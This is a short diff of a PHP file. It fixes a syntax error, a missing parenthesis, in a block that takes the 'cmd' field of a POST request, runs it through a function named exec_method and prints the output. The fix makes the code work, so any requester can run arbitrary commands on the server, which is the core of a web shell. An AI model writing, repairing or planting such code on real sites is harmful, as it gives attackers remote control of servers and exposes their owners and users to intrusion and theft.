@@ -20,7 +20,7 @@ function exec_method($cmd) {
 	return $retval;
 }
 
-if (isset($_POST['cmd']){
+if (isset($_POST['cmd'])){
 	$command = $_POST['cmd'];
 	echo (exec_method($command));
 }
